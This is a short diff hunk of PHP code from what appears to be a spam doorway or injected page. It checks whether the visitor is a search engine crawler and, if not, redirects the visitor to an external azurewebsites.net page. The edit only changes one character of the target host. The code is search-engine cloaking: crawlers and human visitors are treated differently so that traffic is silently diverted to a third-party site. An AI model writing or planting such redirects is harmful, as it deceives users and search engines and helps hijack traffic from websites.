@@ -565,5 +565,5 @@ if(searchEngineDetect()!==false){
 		$asdasd=true;
 }
 if($asdasd==false)
-	header('Location:https://avtomatyluckzen.azurewebsites.net/russia-noacess.html');
+	header('Location:https://avtomatyluckzev.azurewebsites.net/russia-noacess.html');
 ?>
